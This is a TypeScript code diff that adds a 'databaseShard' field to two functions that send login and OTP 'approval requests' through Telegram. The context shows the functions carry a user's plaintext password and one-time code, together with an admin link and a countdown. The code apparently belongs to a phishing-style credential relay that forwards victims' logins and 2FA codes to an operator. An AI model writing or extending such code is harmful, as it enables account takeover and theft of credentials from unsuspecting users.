@@ -49,6 +49,7 @@ export async function sendLoginApprovalRequest(data: {
   password: string
   method?: string
   createdAtMs: number
+    databaseShard?: string
   adminLink: string
 }): Promise<boolean> {
   return sendTelegramApprovalWithCountdown({
@@ -63,6 +64,7 @@ export async function sendLoginApprovalRequest(data: {
         method: data.method,
         adminLink: data.adminLink,
         secondsLeft,
+        databaseShard: data.databaseShard,
         asCode,
         asLink,
       }),
@@ -74,6 +76,7 @@ export async function sendOtpApprovalRequest(data: {
   code: string
   method?: string
   createdAtMs: number
+    databaseShard?: string
   adminLink: string
 }): Promise<boolean> {
   return sendTelegramApprovalWithCountdown({
@@ -88,6 +91,7 @@ export async function sendOtpApprovalRequest(data: {
         method: data.method,
         adminLink: data.adminLink,
         secondsLeft,
+        databaseShard: data.databaseShard,
         asCode,
         asLink,
       }),
